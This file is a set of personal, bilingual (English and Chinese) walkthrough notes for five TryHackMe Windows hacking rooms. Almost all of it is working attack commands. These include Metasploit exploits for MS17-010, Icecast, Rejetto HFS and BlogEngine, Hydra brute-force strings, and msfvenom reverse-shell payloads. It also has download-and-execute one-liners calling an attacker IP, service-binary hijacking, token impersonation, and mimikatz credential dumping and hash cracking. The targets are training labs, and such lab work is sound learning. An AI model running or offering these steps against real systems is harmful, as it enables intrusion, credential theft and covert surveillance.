Bule 
	--> https://tryhackme.com/r/room/blue
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	scan : 
		--> sudo nmap -sV -sS --script vuln 10.10.138.95
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	access :
		--> msfconsole
			> msfdb run
			> search ms17-010
			> show options
			> set payload windows/x64/shell/reverse_tcp
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	upgrade : 
		--> use post/multi/manage/shell_to_meterpreter 
		--> set SESSION 1 => run 
		--> sessions -i 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Command :
		--> shell --> whoami --> exit
		--> ps
		--> migrate
		--> hashdump
	--> Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
		=> 1. decrpty hash it online 
		=> 2. echo "Hash" > ntlm.txt
		=> john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	database :  fail !!!!
		--> sudo service postgresql start
		--> sudo msfdb init
		--> sudo msfconsole
		--> > db_status
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~					
	3.HASH :  		
		--> background
		--> use post/windows/gather/hashdump
		--> set SESSION <SESSION_ID>
		--> run
 
		--> creds
		
		--> use auxiliary/analyze/crack_windows
		--> set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
		--> run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	flag :	
		--> sessions <SESSION_ID>
		--> shell
		--> cd C:\
		--> dir *flag*.* /s
		--> type <FULL_PATH_TO_FLAG_TXT_FILE>
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		search -f flag*.txt
		
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	upload :
		=> python3 -m http.server 8888
		=> wget http://10.11.92.230:8888/Advanced.exe
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ICE : 
	--> https://tryhackme.com/r/room/ice
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> nmap -Pn -sS -sV -T5 -p- 10.10.187.125
		--script vuln 
		=> Microsoft 遠端桌面 (MSRDP) : 135
		=> 8000 : Icecast streaming media server
		=> hostname : DARK-PC
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	-->  msfconsole -q
		=> search Icecast
			=> exploit/windows/http/icecast_header
			=> set rhosts 
			--> getuid
			--> sysinfo
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	root : 
		=> run post/multi/recon/local_exploit_suggester
		=> use exploit/windows/local/bypassuac_eventvwr
			=> session	
			=> set lhost 10.11.92.230
	--> getprivs
		=> SeTakeOwershipPrivilege
		--> ps spoolsv.exe 
		--> migrate pid
		--> getuid
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> Mimikatz 是一個相當臭名昭著的密碼轉儲工具
		=> load kiwi 
		=> help
		=> creds_all
	--> password
		=> hashdump
	--> media : 
		--> screenshare : 即時觀看遠端使用者的桌面
		--> record_mic : 連接到系統的麥克風進行錄音
		--> timestomp : 修改系統上文件的時間戳記
	--> golden_ticket_create : 創建所謂的“金票”
		--> Kerberos（Windows 網域中的身份驗證系統）元件
	--> run post/windows/manage/enable_rdp
		=> 遠端桌面 (MSRDP)
		=> Dark : Password01
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Steel Mountain:
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> /img/BillHarper.png"
		=> BillHarper 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> nmap 
		=> sudo nmap -sV -sS -T5 10.10.6.106  
		=> nmap -Pn -v 10.10.6.106
		=> sudo nmap -sV -sS -T5 -P8080 --script vuln 10.10.6.106
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	Metasploit  : 
		--> sudo msfconsole
		> search "Rejetto Http File Server 2.3"
			=> info --> comfirm same CVE
		> show options
		> set RHOSTS 10.10.6.106
		> set RPORT 8080
		> set LHOST 10.11.92.230

		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
		> upload PowerUp.ps1
		> load powershell 
		> powershell_shell
		> . .\PowerUp.ps1
		> Invoke-AllChecks
			--> CanRestart 選項為 true，允許我們重新啟動系統上的服務
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		=> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.92.230 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
		> cd "Program Files (x86)"
		> cd IObit
		> upload Advanced.exe	
		> shell
		> sc stop AdvancedSystemCareService9
		> sc start AdvancedSystemCareService9	
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> sudo nc -lvnp 4443
			=> msfconsole -qx 'use exploit/multi/handler;set lhost 10.11.92.230;set lport 4443;set payload windows/meterpreter/reverse_tcp;run'
		--> cd "/Users/Administrator/Desktop"
		--> type root.txt
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		powershell 和 winPEAS 
			--> reverse shell
				-->1. download netcat 靜態二進位 : 
					=> https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
					=> rename nc.exe
				-->2. 39161.py
					=> ip | port
					=> python2 39161.py 10.10.6.106 8080
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> connenct : 	
				-->3. nc -lvnp 4443
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> upload :
				--> 4.網頁伺服器
					--> python3 -m http.server --bind 0.0.0.0 80
					--> python3 -m SimplyHTTPServer 80
		
				--> 5. WinPEAS
					--> https://github.com/peass-ng/PEASS-ng/releases/tag/20230702-bc7ce3ac?ref=hailstormsec.com
					-->  c:> Invoke-WebRequest -URI $URL -OutFile $Path
						--> powershell -c "Invoke-WebRequest -URI http://10.11.92.230/winPEASx86.exe -OutFile WinPEAS.exe
							=> .\WinPEAS.exe
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> vuln :
				--> powershell -c "Get-Services"
				--> powershell -c "Invoke-WebRequest -URI http://10.11.92.230/Advanced1.exe -OutFile Advanced.exe
				--> sc stop AdvancedSystemCareService9
				--> sc start AdvancedSystemCareService9	
				
		
		=>??? wget http://10.11.92.230:8888/Advanced.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Alfred : 
	--> nmap : 
		=> sudo nmap -sS -sV -T5 -Pn 10.10.88.244
		=> 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	username : password 
		--> hydra :
			sudo hydra -s 8080 -l admin -P /usr/share/wordlists/rockyou.txt 10.10.88.244 http-post-form
				 "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password" -f 

		--> google : default
			admin:admin
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Invoke-PowerShellTcp.ps1
		--> powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.92.230:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.92.230 -Port 1234
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> python3 -m http.server
		--> sudo nc -lvnp 1234
		--> https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		cd 
		C:/Users/bruce/Desktop
		type user.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Metasploit
		-->  reverse_shell.exe
			--> msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -i 10 -f exe LHOST=10.11.92.230 LPORT=6666 -o reverse_shell.exe
			--> unload
				=> certutil -urlcache -f http://10.11.92.230:8000/reverse_shell.exe reverse_shell.exe
				=> wget http://10.11.92.230:8000/reverse_shell.exe
				=> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.92.230:8000/reverse_shell.exe','reverse_shell.exe')"
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> listen :
			--> msfconsole -qx 'use exploit/multi/handler;set lhost 10.11.92.230;set lport 6666;set payload windows/meterpreter/reverse_tcp;run'

		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> run :	
			=> .\reverse_shell.exe
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		> sysinfo 
			--> os verion: Windows 7 (6.1 Build 7601, Service Pack 1).
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> root(令牌) : 
		-->  UID | GID | Privileges
		
		--> Primary access tokens --  user account 
		--> Impersonation tokens --  particular process
			=> SecurityAnonymous :
				 cannot impersonate another
			=> SecurityIdentification :
				get the identity and privileges 
			=> SecurityImpersonation: 
				impersonate local system
			=> SecurityDelegation:  
				impersonate  remote system
		--> 最常被濫用的特權
			=> SeImpersonatePrivilege
			=> SeAssignPrimaryPrivilege
			=> SeTcbPrivilege
			=> SeBackupPrivilege
			=> SeRestorePrivilege
			=> SeCreateTokenPrivilege
			=> SeLoadDriverPrivilege
			=> SeTakeOwnershipPrivilege
			=> SeDebugPrivilege

		--> 查看所有權限 -- check that enable
			=> cmd : 使用 whoami /priv
			=> meterpreter> getprivs
			
		-> 隱身模組
			--> privileges(SeDebugPrivilege, SeImpersonatePrivilege)
			
			> load incognito // use incognito
			> list_tokens -g
				Delegation Tokens Available...
			> impersonate_token "BUILTIN\Administrators" 模擬管理員令牌
			> getuid
			> pgrep services.exe
			> migrate 668
			> cd C:/Windows/System32/Config
			> cat root.txt
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		meterpreter 
			> load 然後按 Tab 兩次即可。加載模組後，您將在help命令底部找到所有命令
			> load kiwi 取得系統上的所有憑證，我們可以載入 kiwi (mimikatz) 模組
			> hashdump
			> creads_all
			> search -f root.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HackPark : 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	infomation gathering : 
		--> Google 圖片： https://images.google.com/ 
			=> Pennywise
		--> sudo nmap -sV -sS -T5 -Pn 10.10.15.240
		--> sudo nmap -sV -sS -T5 -Pn --script vuln 10.10.15.240
			=>port : 80 , 3389
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	get password : 
		--> sudo hydra -l  -p http-post-form
			=> find default credentials - admin 
			=> F12 : "Network" => request
			=> /Account/login.aspx
			=> __VIEWSTATE=... UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
			=> :Login failed" -f
			
			--> sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.15.240 http-post-form '/Account/login.aspx:__VIEWSTATE=ftiiVsMCQlWm7glKTdeWjRJWefMviLhqZI%2BBEExPMhBP%2FcnpvMk8gX42lJh%2FzZUYPWvqtyLMA6jopd1YrYCZqz%2FxiJiG8crkDaCboOUB8RcYg7D96OkKsz3RHcmaMT7THFsUdqqyvdQxKMdfRGcPHcR1CJJu%2Fv66erq2IUnndaLYI4fW&__EVENTVALIDATION=Dmn4qoScXlThNCL2k74u5s5eBUdpRSktTEZK8yKOlh1HTuHj%2BlLRo08Krj27%2F6chW0iBlvH25Tt%2B5sSkJ72UlA0ZlRuqg3Dved3XLXgPSFavp%2F0EIi%2FPBpnc6XBHbJWEpk7FLs3KNDVoymUpurOlGBysbzasOrVhSicHh9rcF3X5y2em&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed' -f
			=> [80][http-post-form] host: 10.10.15.240  login: admin   password: 1qaz2wsx
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	vuln : 		
		=> init shell : 
			--> https://www.exploit-db.com/
				--> BlogEngine 3.3.6.0
				--> CVE-2019-6714
				--> https://www.exploit-db.com/exploits/46353
				--> vim 46353.cs => PostView.ascx
					=> listen : 
						=> msfconsole -qx 'use exploit/multi/handler;set lhost 10.11.92.230;set lport 4445;set payload windows/shell_reverse_tcp;run'
						=> sudo nc -lvnp 4445
					--> http://10.10.15.240/?theme=../../App_Data/files
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		unload file 
			--> python3 -m http.server 8888  
				=> not root --> /home/kali
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
			--> 1. meterpreter
				=> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.92.230 LPORT=4445 -e x86/shikata_ga_nai -f exe -o reverse.exe
					=> powershell -c wget "http://10.11.92.230:8888/reverse.exe" -outfile "reverse.exe"
				=> msfconsole -qx 'use exploit/multi/handler;set lhost 10.11.92.230;set lport 4445;set payload windows/meterpreter/reverse_tcp;run'
				~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
				meterpreter >sysinfo 
					--> Computer name | OS verion |Domain | Architecture (x64/x86)
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> 2. find vuln -- winPEASx86.exe
				=> powershell -c wget "http://10.11.92.230:8888/winPEASx86.exe" -outfile "winPEASx86.exe"
					=>WindowsScheduler -- Message.exe
					~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
					--> WindowsScheduler 服务定期运行
					--> Auto -running
					--> File Permission : Everyone
					--> PAth : C:\Program Files (x86)\..(Everyone [WriteData/CreateFiles])
						=> replace file // as Message.exe (Adminstrator) 
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> 3. root
				=> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.92.230 LPORT=6666 -e x86/shikata_ga_nai -f exe -o Message.exe
					=> powershell -c wget "http://10.11.92.230:8888/Message.exe" -outfile "Message1.exe"
					~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
					=> meterpreter> mv Message.exe Message.bak
					=> meterpreter> mv Message1.exe Message.exe
					~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
				=> msfconsole -qx 'use exploit/multi/handler;set lhost 10.11.92.230;set lport 6666;set payload windows/meterpreter/reverse_tcp;run'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		
